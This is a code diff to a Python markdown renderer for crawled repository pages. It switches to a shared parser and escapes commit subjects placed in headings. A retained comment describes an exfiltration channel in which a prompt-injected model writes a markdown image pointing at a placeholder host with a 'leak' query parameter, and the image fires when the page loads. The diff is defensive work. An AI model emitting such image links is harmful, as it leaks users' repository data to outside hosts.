@@ -13,14 +13,14 @@ friendly ```mermaid diagrams and code blocks the prompts produce.
 import html as _html
 import re
 
-from crawl.core.render import md_heading
+from crawl.core.render import md_heading, markdown_parser
 
 from markdown_it import MarkdownIt
 
 # coderay-q2r.53: image syntax is off. `![x](https://host/p?leak=...)` became a
 # live <img> that fires on page open, an egress channel from repo text via
 # a prompt-injected model. html=False does not cover it.
-_MD = MarkdownIt("commonmark", {"html": False, "linkify": False, "breaks": False}).enable(["table"]).disable("image")
+_MD = markdown_parser()
 
 
 def md(text):
@@ -512,7 +512,7 @@ def render_markdown(name, shared):
     parts.append("## The graveyard\n")
     for g in shared.get("graves", []):
         c = g["commit"]
-        parts.append(f"### ⚰ {c['subject']}")
+        parts.append(f"### ⚰ {md_heading(c['subject'])}")
         parts.append(f"_{c['date']} · `{c['hash'][:7]}` · {c['count']} files · `{c['scope']}/`_\n")
         parts.append(g["entry_md"].strip() + "\n")
 
